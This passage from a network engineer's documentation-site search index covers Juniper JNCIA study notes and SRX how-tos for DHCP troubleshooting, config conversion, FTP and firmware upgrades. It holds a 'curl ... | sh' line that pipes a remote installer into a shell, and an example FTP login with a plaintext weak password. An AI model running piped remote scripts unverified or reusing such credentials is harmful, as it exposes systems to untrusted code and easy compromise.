49\n/var/db/config\n\n#system log\n/var/log\n\n#core files\n/var/tmp\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#interfaces-basic-config","title":"Interfaces &amp; Basic config","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#junos-interfaces","title":"JUNOS Interfaces","text":"<ul> <li>FXP0 me0 : for Management OOB</li> <li>FXP1 me0 : for Internal Management CP/FP</li> <li>interface sequence MM-F/P/T</li> <li>MediaType-ChassisSlotNumber/PICSlot/PortNumber</li> <li>example</li> <li>Physical Interface Card [PIC]</li> <li>Flexible PIC Concentrator [FPC]</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#network-interfaces","title":"Network Interfaces","text":"<ul> <li>ethernet</li> <li>sonet</li> <li>etc..</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#service-interfaces","title":"Service Interfaces","text":"<ul> <li>logical services</li> <li>gre tunnel</li> <li>ip tunnel</li> <li>encryption</li> <li>Loopback Interfaces</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#physical-interfaces-speeds","title":"Physical Interfaces speeds","text":"<ul> <li>xe &gt; 10Gb</li> <li>et &gt; 40Gb</li> </ul> <p>Interface Physical properties - speed - duplex - MTU - Data Link layer Protocol</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#logical-properties","title":"Logical properties","text":"<ul> <li>Protocol Family (inet, inet6, ..)</li> <li>Address (IPv4, IPv6)</li> <li>VLANs</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#monitor-upgrade-recovery","title":"Monitor, Upgrade &amp; Recovery","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#sw-hw","title":"SW, HW","text":"<pre><code>#verifies SW info/Statistics\nshow system ....\n\n#verifies HW info/Statistics\nshow chassis ...\n\n#shows temp\nshow chassic environment\n\n#Monitor used for live monitoring\nMonitor interfaces ge000\n\n#firmware upgrade\n#Install a software package on all Routing Engines in a cluster\n#System Halt (Recomended before doing hardshutdown) vs shutdown (Turns off the CP but still device is on)\n#When upgrading software, must be placed in /var/tmp/\n#Software must match on all REs - UISU Unified In Service Upgrade\n\nrequest system software add \n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#routing-forwarding-tables","title":"Routing &amp; forwarding tables","text":"<ul> <li> <p>inet.0 ipv4 unicast routing table (stores interface local and direct routes, static routes, and dynamically learned routes)  </p> </li> <li> <p>inet6.0 ipv6 unicast routing table (stores interface local and direct routes, static routes, and dynamically learned routes)</p> </li> <li> <p>inet.1 IPv4 multicast forwarding cache (stores the IPv4 (S,G) group entries that are dynamically created as a result of join state information)      </p> </li> <li> <p>inet6.1 IPv6 multicast forwarding cache (stores interface local and direct routes, static routes, and dynamically learned routes)</p> </li> <li> <p>inet.3 IPv4 MPLS paths (stores the egress address of an MPLS label-swiched path (LSP), the LSP name, and the outgoing interface name)</p> </li> <li> <p>mpls.0 MPLS next hop</p> </li> <li> <p>inet.2 Used for URPF - prevent loops</p> </li> <li> <p>instance-name.inet.0 If you configure a routing instance, Junos OS creates the default unicast routing table instance-name.inet.0.</p> </li> <li> <p>instance-name.inet.2 If you configure routing-instances instance-name protocols bgp family inet multicast in a routing instance of type VRF, Junos OS creates the instance-name.inet.2 table.</p> </li> </ul> <p>Forwarding table has exisiting interface and next adjacent IP address</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#routing-preferences","title":"Routing Preferences","text":"<pre><code>0       Direct/Local\n5       Static \n10      OSPF Internal\n15/18   ISIS Internal\n100     RIP\n150     OSPF External\n160/165 ISIS External\n170     BGP\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#routing-instances","title":"Routing Instances","text":"<p>Creates Internal Router, Virtually isolated Interfaces and has it's own Routing Table There is a Master Routing Instance and you can then create user-defined instances which is called Global Routing table</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#types-of-routing-instances","title":"Types of routing instances","text":"<ul> <li> <p>Forwarding Use this routing instance type for filter-based forwarding applications. no 1:1 mapping between Interface and Instance, all Interfaces belong to inet.0</p> </li> <li> <p>No-Forwarding There is no corresponding forwarding table. All routes are installed into the default forwarding table. </p> </li> <li> <p>L2VPN </p> </li> <li> <p>Virtual-Router Similar to a VPN routing and forwarding instance type, but used for non-VPN-related applications. </p> </li> <li> <p>VPLS Use the virtual private local-area network service (VPLS) routing instance type for point-to-multipoint LAN implementations between a set of sites in a VPN. </p> </li> <li> <p>VRF Use the VPN routing and forwarding routing (VRF) instance type for Layer 3 VPN implementations. 1:1 mapping between instance and interface</p> </li> </ul> <p>Junos OS routing protocol process (rpd) is responsible for synchronizing the routing information between the routing and forwarding tables. Only the active routes are installed in the forwarding table. The routing protocol process then copies the forwarding table to the routers Packet Forwarding Engine. RE has Routing Table &amp; Master Forwarding Table  PFE has Forwarding Table</p> <p>additional resource</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#junos-services","title":"JUNOS Services","text":"<ul> <li>rpd: routing protocol process</li> <li>device control process (dcd): controls the devices interfaces</li> <li>management process (mgd): user access </li> <li>chassis process (chassisd): controls the devices properties itself</li> <li>Packet Forwarding Engine process (pfed): controls the communication between PFE and RE</li> </ul> <p>Notes: - In static Routing when you have something like a loopback and you're pinging another loopback. Even if reachable, by default the source IP being used is the physical interface IP adress and not the loop back or originating IP address - To get a response you must have the other path enabed to reach back to you If you ping and don't get a response that might be because you have a route to destination and no route back to the source - In Dynamic Routing when looking at routing table results, if you find a result then it should be %100 reachable as it's checked. Unlike Static Route where it might be not reachable</p> <p>Routing no-advertise is used to stop static ip redistribution into dynamic routing - This is configured in static route</p> <pre><code>Default route is 0.0.0.0/0\n</code></pre> <p>static route resolve is used when you have more than 2 routers, instead of defining the routes all the way, you set resolve and it figures it out through the in between Routers</p> <p>next-hop has default preference of 5 qualified next-hop has a configurable preference</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#routing-policies-options","title":"Routing Policies &amp; Options","text":"<ul> <li>Routing Policies &amp; Options &gt; Acts on Routing Information</li> <li>Routing Policies applied to Import &amp; Export Policies</li> <li>Routing Policy Match [If Route coming From?]  &gt; conditions based upon a route's properties, prefix, route list, protocol, protocol attributes, next-hop, neighbors</li> <li>Routing Flow Control Actions [Then? Action] : accept, default-action accept, reject, default-action reject, next term, next policy</li> <li>Routing Policy Action Modifiers: local-preference, metric, next-hop, origin, preference</li> <li>Will evaluate next term if first term not matching and does not require mention of next term</li> </ul> <p>extra sources: - policy default actions default policies - juniper routing policy - Configuring Junos Policies Filters</p> <p>It is possible, and highly probable, to have more than one match condition per term, There can be only a single terminating action, but the action statement can be used to modify several attributes of a prefix at the same time.</p> <p>Policy must match all items in a Term for it to be applied</p> <pre><code>Prefix-Lists &amp; Route Filters:\n    Prefix-List: list of IPs, range, ..\n        Prefix-List-Filter: exact, longer, orlonger, upto, prefix-length-range, through\n    Route-filter: Exact IP or Range however it's not shared and only in the line you're using\n        route-filter x.x.x.x/x address-mask x.x.x.x\n</code></pre> <p>Policy evaluated and if no match, continue to next Policy, and If no match then default policy will be evaluated Policy evaluation will stop once a terminating action is found If a term does no contain a terminating action the next-term is evaluated.</p> <pre><code>policy-options {\n    policy-statement POLICY-NAME {\n        term {\n                from {\n                    MATCH-CONDITIONS;\n                    MATCH-CONDITIONS;\n                    MATCH-CONDITIONS;\n                }\n                then {\n                    ACTIONS;\n                }\n        }\n    }\n}\n\nterm 1 {\n    from {\n        protocol bgp;\n        rib vrf-customer2.inet.0;\n        community customer;\n    }\n    then {\n        next-hop next-table vrf-customer1.inet.0;\n    }\n}\n</code></pre> <p>You can specify next term and next policy to evaluate them as well In the Import - From &gt; They must all be True in a term in order to run that term Matching with a prefix-list (Must match at least one of the entries) or prefix-list-filter (exact, longer, etc...)</p> <pre><code>set protocols rip group to-R2 export advertise-routes-through-rip\nset policy-options policy-statement advertise-routes-through-rip term 1 from protocol direct\nset policy-options policy-statement advertise-routes-through-rip term 1 from protocol rip\nset policy-options policy-statement advertise-routes-through-rip term 1 then accept\n\nprotocols {\n    ospf {\n        area 0.0.0.0 {\n            interface ge-0/0/0.0;\n        }\n        export po;\n    }\n}\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#routing-policies-options-flow","title":"Routing Policies &amp; Options Flow","text":"<p>Notes:</p> <ul> <li>Firewall Filters ACLs &gt; Acts on Packets</li> <li>Match conditions based on a packet matching different fields in packet header, Match source/destination, Match criteria includes port numbers, IP, etc..</li> <li>Matching depends on each Family and it's properties, like family inet Route might be hidden because of an invalid next-hop or reject routing policy</li> <li>Default action to Firewall Filter is discard</li> </ul> <p>Firewall Policy - Firewall Policy Match condition: check packet header for binary &gt; src/dst address L3, src/dst port L4, protocol, bits - Firewall Filter Terminating Actions: accept, discard, reject - Firewall Filter Action Modifiers: count, log, syslog, policer, forwarding-class &amp; loss-priority - Firewall Filter Flow Control Action: Next-term only When firewall filter matches a term and no action is set then default action is implicit accept and filter evaluation terminates</p> <pre><code>firewall {\n    family FAMILY-NAME {\n        filter FILTER-NAME {\n            accounting-profile name; \n            instance-shared;\n            interface-specific; \n            physical-interface-filter; \n            term term-name {\n                filter filter-name; \n            }\n            term TERM-NAME {\n                from {\n                    MATCH-CONDITIONS; \n                    ip-version ip-version { \n                        match-conditions;\n                        protocol (tcp | udp) {\n                            match conditions; \n                        }\n                    }\n                }\n                then {\n                    ACTIONS,\n                }\n            }\n        }\n    }\n}\n</code></pre> <p>Applying above to inet family on a ge port. This will apply the filter on outgoing packets.</p> <pre><code>root# show interfaces\nge-0/0/0 {\n    unit 0 {\n        family inet {\n            filter {\n                output TEST;\n            }\n            address 10.10.10.1/24;\n        }\n    }\n}\n</code></pre> <p>additional source: firewall filter stateless guidelines for configuring</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#firewall-filters-acls","title":"Firewall Filters ACLs","text":"<p>requirement to have devices communicate on IP network - end to end communications path - routing information on participating L3 devices</p> <p>RE handels protocol processes, SW processes that control chassis, interfaces, system management &amp; user access. Also controls PFE by providing L2 &amp; L3 forwarding tables </p> <pre><code>Default import/export policy\nBGP    Imports-All    Exports-All\nOSPF   Imports-All    Exports-None*\nIS-IS  Imports-All    Exports-None*\nRIP    Imports-All**  Exports-None\n\n*Flooding will happen by default for IntraArea routes only\n**Imports only from manually configured neighbors\n</code></pre> <pre><code>show route output\n</code></pre> <p>Permissions - operator: Clear, network, reset, trace, and view permissions; - read-only: View permissions; and - unauthorized: No permissions.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#unicast-rpf-urpf","title":"Unicast RPF (URPF)","text":"<p>Unicast Reverse Path Forwarding: - If I know how to reach you then you are excepted otherwise, discarded Usually configured on edge devices. - This is an antispoofing/DOS checking mechanism. - This controls the routers installed in the RE.</p> <p>URPF Modes:</p> <ul> <li> <p>Strict Mode: </p> <ul> <li>It has to be able to reach it back on the same Interface it was reached. if Juni gets packet on ge-0/0/0 then it has to be able to reach back that address form this Interface.</li> <li>Routing Table must have a route installed that can lead back to the Source address and the next-hop for that route.</li> <li>Asymmetric Routing is not allowed.</li> </ul> </li> <li> <p>Lose Mode: </p> <ul> <li>It will allow reaching back to the source address through a different Interface.</li> <li>Any route installed in the RE can be used to reach back to the Source. But it it required to have some oute than can accomplish that.</li> <li>Asymmetric Routing is allowed</li> </ul> </li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/","title":"Juniper Configuration Convertor Display set","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#rust-method","title":"Rust Method","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#windows","title":"Windows","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#install-all-needed-packages","title":"Install all needed packages","text":"<pre><code>rustup uninstall toolchain stable-x86_64-pc-windows-msvc\nrustup toolchain install stable-x86_64-pc-windows-gnu\nrustup default stable-x86_64-pc-windows-gnu\ncargo install jcc-cli\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#clone-the-repository","title":"Clone the repository","text":"<pre><code>git clone https://github.com/584F525F/juniper-config-converter.git\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#enter-the-juniper-config-converter-directory","title":"Enter the <code>juniper-config-converter</code> directory","text":"<pre><code>cd juniper-config-converter\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#copy-your-juniper-configuration-file-into-this-directory","title":"Copy your Juniper configuration file into this directory","text":"<p>Copy the Juniper configuration file into this directory, you can rename it to 'juniper_test.txt'</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#start-the-conversion-process","title":"start the conversion process","text":"<p><pre><code>jcc-cli --file juniper_test.txt\n</code></pre> You should get the result of the conversion almost immediately.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#linux","title":"Linux","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#install-rust-also-installs-cargo-which-is-used-to-run-the-script","title":"Install rust, also installs cargo which is used to run the script","text":"<pre><code>curl https://sh.rustup.rs -sSf | sh \n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#install-the-jcc-cli","title":"Install the JCC-CLI","text":"<pre><code>cargo install jcc-cli\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#clone-the-repository_1","title":"Clone the repository","text":"<pre><code>git clone https://github.com/584F525F/juniper-config-converter.git\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#run-the-script-and-pass-your-juniper-config-file-parameter-to-it","title":"Run the script and pass your juniper config file parameter to it","text":"<pre><code>jcc-cli --file juniper_test.txt\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#python-method-juniper_display_set","title":"Python Method juniper_display_set","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#clone-the-repository_2","title":"Clone the repository","text":"<pre><code>git clone https://github.com/584F525F/juniper_display_set.git\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#enter-the-juniper_display_set-directory","title":"Enter the juniper_display_set directory","text":"<pre><code>cd juniper_display_set\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#execute-the-script-by-providing-the-input-configuration-file-and-redirecting-the-output-to-a-new-file","title":"Execute the script by providing the input configuration file and redirecting the output to a new file","text":"<p><pre><code>python3 junos_converter.py --input ../sample_config.cfg &gt; sample_config_set.set\n</code></pre> If you check the new file, it will have the set config</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Convertor_Display_set/#using-another-juniper-method","title":"Using another Juniper Method","text":"<p>you can always use any (similar) Juniper device and do</p> <pre><code>configure\nload override terminal\n#paste your config\n&lt;Crtl-D&gt;\nshow | display set\nrollback\nexit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Rescue_and_Auto_recovery/","title":"Juniper Configuration Rescue and Auto recovery","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Rescue_and_Auto_recovery/#why-configuring-this-is-important-you-say","title":"Why configuring this is important you say?","text":"<p>During the boot process, the device is configured based on a predefined configuration file. The device selects the configuration file based on the sequence shown below</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_Configuration_Rescue_and_Auto_recovery/#the-solution","title":"the solution","text":"<p>To show you current system alarms run</p> <pre><code>show system alarms\n</code></pre> <p>If you see the 2 Minor alarms then proceed with the next step</p> <p></p> <p>You will need to run the following commands</p> <pre><code>request system configuration rescue save\nrequest system autorecovery state save\n</code></pre> <p></p> <p>Once done executing the commands then check for alarms again by running </p> <pre><code>show system alarms\n</code></pre> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_DHCP-Service_subsystem_is_not_responding/","title":"Juniper DHCP-Service subsystem is not responding","text":"<p>I had an issue where it was reported that all recent client devices connecting to the WLAN are not getting an IP Address, I was able to see that on the WLAN Controller end (this was an Aruba Mobility Controller). I then needed to see what device on the network is providing DHCP, it was our Juniper SRX Firewall. Below are some of the checks I completed to determine what the issue was and to resolve it.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_DHCP-Service_subsystem_is_not_responding/#dhcp-service-subsystem-is-not-responding","title":"dhcp-service subsystem is not responding","text":"<p>If running any sub command to the dhcp binding results in such error, we will need to restart the DHCP Service.</p> <pre><code>show dhcp server binding summary\nerror: the dhcp-service subsystem is not responding to management requests\n</code></pre> <p></p> <p>restart the DHCP service</p> <pre><code>restart dhcp-service\n</code></pre> <p></p> <pre><code>Junos Dynamic Host Configuration Protocol process started, pid 80252\n</code></pre> <pre><code>show dhcp server binding\n</code></pre> <pre><code>IP address        Session Id  Hardware address   Expires     State      Interface\n172.50.0.122      113         00:52:5a:20:2e:a9  28800       BOUND      irb.1234\n172.50.2.85       596         00:50:5a:20:2e:85  28798       BOUND      irb.1234\n172.50.206.157    119590      00:50:5a:20:2e:9b  28798       BOUND      irb.1234\n172.50.1.75       325         00:50:5a:20:2e:a9  28795       BOUND      irb.1234\n172.50.2.199      710         00:50:5a:21:2e:03  28796       BOUND      irb.1234\n172.50.2.84       595         00:50:5a:21:2e:3c  28795       BOUND      irb.1234\n172.50.0.123      114         00:50:5a:25:2e:75  2324        BOUND      irb.1234\n172.50.2.90       601         00:50:5a:25:2e:95  3602        BOUND      irb.1234\n172.50.2.192      703         00:50:5a:25:2e:39  28798       BOUND      irb.1234\n172.50.151.250    39333       00:50:5a:25:2e:59  28798       BOUND      irb.1234\n172.50.151.153    39235       00:50:5a:26:2e:0a  28797       BOUND      irb.1234\n172.50.103.95     158946      00:50:5a:db:2e:cb  4208        BOUND      irb.1234\n172.50.58.75      159006      00:50:5a:1d:2e:ee  9902        BOUND      irb.1234\n172.50.103.57     158908      02:50:5a:26:2e:19  11479       BOUND      irb.1234\n172.50.103.130    158981      02:50:5a:20:2e:24  6981        BOUND      irb.1234\n172.50.103.62     158913      02:50:5a:9c:2e:8e  3380        BOUND      irb.1234\n172.50.101.242    158579      02:50:5a:7d:2e:fc  10641       BOUND      irb.1234\n172.50.69.96      84222       04:50:5a:14:2e:18  5061        BOUND      irb.1234\n172.50.102.199    158794      06:50:5a:2e:2e:05  6409        BOUND      irb.1234\n172.50.104.78     159186      06:50:5a:10:2e:0f  10997       BOUND      irb.1234\n172.50.98.203     157769      06:50:5a:87:2e:12  10478       BOUND      irb.1234\n172.50.101.205    158542      06:50:5a:80:2e:b3  9842        BOUND      irb.1234\n172.50.103.248    159100      0a:50:5a:3d:2e:4b  8707        BOUND      irb.1234\n172.50.102.130    158723      0a:50:5a:d3:2e:dd  7852        BOUND      irb.1234\n172.50.102.81     158674      0a:50:5a:50:2e:33  11358       BOUND      irb.1234\n172.50.104.92     159200      0c:50:5a:ab:2e:56  11436       BOUND      irb.1234\n172.50.103.45     158896      0e:50:5a:d3:2e:91  3300        BOUND      irb.1234\n172.50.101.87     158422      0e:50:5a:22:2e:c1  9821        BOUND      irb.1234\n172.50.102.220    158815      0e:50:5a:2e:2e:e1  7713        BOUND      irb.1234\n172.50.102.158    158752      10:50:5a:41:2e:34  8363        BOUND      irb.1234\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_DHCP-Service_subsystem_is_not_responding/#other-things-to-check-for-when-you-have-dhcp-issues","title":"other things to check for when you have DHCP issues","text":"<p>checking arp for the affected vlan, in this example it's vlan 1234</p> <pre><code>show arp no-resolve | match irb.1234 | count\n</code></pre> <p>check if anyone made any changes recently, maybe someone bricked DHCP?</p> <pre><code>show configuration | compare rollback ?\n\nPossible completions:\n0                    2023-10-30 16:59:23 EDT by userx via cli\n1                    2023-10-30 16:54:52 EDT by userx via cli\n2                    2023-10-26 17:26:49 EDT by usery via cli\n3                    2023-10-26 17:26:05 EDT by usery via cli commit confirmed, rollback in 5mins\n4                    2023-06-20 14:56:35 EDT by userd via cli\n5                    2023-06-20 14:56:01 EDT by userd via cli\n</code></pre> <p>checking the address-assignment configuration, from the results find your VLAN and check the subnet, then calculate the number of hosts your subnet has, this is to eliminate DHCP starvation issues.</p> <pre><code>show configuration | no-more | display set | match address-assignment\n</code></pre> <p>checking the number of devices on vlan 1234, this gives an idea if we have any bindings at all or not</p> <pre><code>show arp no-resolve | match irb.1234 | count\n#Count: 129 lines\n</code></pre> <p>checking if the client device MAC address actually has no IP binding in the Firewall, this will eliminates issues with the Controller.</p> <pre><code>show arp no-resolve | match 0c:89:86:d2:1e:3e\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_DHCP_Client_Static_Binding/","title":"Juniper DHCP Client Static Binding","text":"<p>Configuring a Client DHCP binding, you will need:</p> <ul> <li>Client device IP Address</li> <li>Client device MAC Address</li> </ul> <pre><code>set access address-assignment pool &lt;dhcp-pool-name&gt; family inet host &lt;host-name&gt; hardware-address &lt;mac-address : seperated&gt;\nset access address-assignment pool &lt;dhcp-pool-name&gt; family inet host &lt;host-name&gt; ip-address &lt;ip-address&gt;\n</code></pre> <p>Example</p> <pre><code>set access address-assignment pool BackOfficeLAN family inet host StaffPC hardware-address 11:00:62:58:88:95\nset access address-assignment pool BackOfficeLAN family inet host StaffPC ip-address 192.168.1.20\n</code></pre> <p>Checking on DHCP binding</p> <pre><code>show dhcp server binding\nshow dhcp server statistics\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_FTP_CLI/","title":"Juniper SRX FTP CLI","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_FTP_CLI/#enabling-ftp-on-juniper","title":"Enabling ftp on Juniper","text":"<pre><code>configure\nset system services ftp\nset security zones security-zone MGMT interfaces irb.100 host-inbound-traffic system-services ftp                   \nset security zones security-zone MGMT interfaces ge-0/0/4.100 host-inbound-traffic system-services ftp\ncommit confirmed\n</code></pre> <p>This gives FTP on LAN side so use VPN IP to connect.</p> <p>Uploading the files - You can use an FTP Client such as WinSCP or FileZilla to upload the   files, you can check the article explaining how to use FTPZilla [FileZilla  FTP Client] - Make sure you have the following path &amp; directories created /cf/var/home    ftpuser If the ftpuser directory is missing then create it. - Upload all the files to /cf/var/home/ftpuser/ - The ftp link that you should be using to login and get the files should   be something like this ftp://ftpuser:ftpuser123@/FileName YOU   MUST USE THE LOCAL PRIVATE IP ADDRESS FOR THE FTP SERVER - Example link: ftp://ftpuser:ftpuser123@10.10.10.1/firmwarefile.bin   - This link will directly go into the Directory /cf/var/home/ftpuser/ and get the files named  and listed there. cf/var/home/ftpuser"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_FTP_CLI/#disabling-ftp","title":"Disabling FTP","text":"<pre><code>configure\ndelete system login user ftpuser\ndelete system services ftp\ndelete security zones security-zone MGMT interfaces irb.100 host-inbound-traffic system-services ftp\ncommit confirmed\nCommit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_FTP_CLI/#delete-files","title":"Delete files","text":"<pre><code>Exit\nStart shell\nls\nRm (file_name)\nexit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/","title":"Juniper SRX Firmware Upgrade 2","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#requirements","title":"Requirements","text":"<ul> <li>Access to Junos OS Software and/or valid Juniper Account</li> <li>Access to the SRX</li> <li>Supported Models: SRX300 / SRX320 / SRX340 / SRX345 / SRX380</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#common-upgrade-paths","title":"Common Upgrade Paths","text":"<p>Build version is only applicable to the final upgrade. Intermediate versions can use any build version and as such the exact build version is omit from intermediate steps. For more information on software naming see <code>Naming Convention</code>. If you are upgrading an SRX and the upgrade path is not listed refer to <code>Upgrade Paths</code>.</p> <ul> <li>From 15.1x49 to 19.4</li> <li>From 18.2 to 18.4 to 19.4</li> <li>From 19.4 to 20.4 to 21.4</li> <li>From 21.4 to 22.2</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#single-srx-upgrade","title":"Single SRX Upgrade","text":"<p>For use with a single SRX device. For each software upgrade, this section should be completed in its entirety.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#preparation","title":"Preparation","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#1-determine-next-upgrade-version","title":"1. Determine next Upgrade Version","text":"<p>Log into the SRX using SSH.</p> <p><pre><code>#gather the model and current software release\nshow version\n</code></pre> Refer to the <code>Common Upgrade Paths</code> section to determine the next software version.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#2-cleanup-old-files","title":"2. Cleanup old files","text":"<pre><code>request system storage cleanup\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#3-update-the-autorecovery-state","title":"3. Update the Autorecovery State","text":"<pre><code>request system autorecovery state save\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#4-verify-alternate-root-partition-software","title":"4. Verify Alternate Root Partition Software","text":"<pre><code>show system software backup\n</code></pre> <p>Verify the version listed matches the version from the previous step, If they do not match then run this command</p> <pre><code>request system snapshot slice alternate\n</code></pre> <p>Note: This command will take some time to finish."},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#5-create-a-backup-of-the-current-configuration","title":"5. Create a backup of the current configuration","text":"<p>If copying the configuration directly from the terminal</p> <pre><code>show configuration | display set\n</code></pre> <p>If saving the configuration to a file for later transfer using your preferred file transfer method</p> <pre><code>#replace \u201cfilename\u201d with your desired name\nshow configuration | display set | save /var/tmp/filename\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#6-download-new-image","title":"6. Download New Image","text":"<p>If you already have the required software, this step can be skipped.</p> <p>Software downloads are available from Juniper here, search for the model and then select the version from the dropdown. If the version is not listed, you will need to open a support case with JTAC.</p> <p>Download the necessary version and log in with your Juniper account when prompted and accept the terms.</p> <p>After accepting terms you will be prompted with two options, select download image to localhost.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#upgrade-procedure","title":"Upgrade Procedure","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#1-upload-the-new-version-to-the-srx","title":"1. Upload the new version to the SRX","text":"<p>Although multiple methods can be used to upload the new software to the device, this example will show the procedure using SCP.</p> <pre><code>#SCP command\nscp path/to/local/filename  username@&lt;SRX IP Address&gt;:/var/tmp/\n</code></pre> <p>The local path to the file will need to match your system however the target will always be \u201c/var/tmp\u201d.</p> <p>As an example, when running the SCP command from the same directory as the local file and uploading the image to an SRX on the IP address 1.2.3.4</p> <pre><code>scp junos-srxsme-21.4R3.15.tgz jsmith@1.2.3.4:/var/tmp/\n</code></pre> <p>Note: The extension is required otherwise the file will fail to upload.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#2-validate-and-add-the-software-package","title":"2. Validate and add the software package","text":"<p>From the SRX command line, validate and add the software</p> <pre><code>#modify the \u201cfilename\u201d to match filename used in the previous step\nrequest system software add /var/tmp/filename\n</code></pre> <p>This command will take some time to finish.</p> <p>To finish the install, reboot the device</p> <pre><code>request system reboot\n</code></pre> <p>A reboot will take roughly 15 to 25 minutes to complete. Do not power down the device during this time attempting to troubleshoot prematurely.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#3-verification","title":"3. Verification","text":"<p>When the SRX has finished rebooting and is accessible again, log in and verify the expected version has been installed</p> <pre><code>show version\n</code></pre> <p>If the version does not match the expected result, verify the version of software used to upgrade the 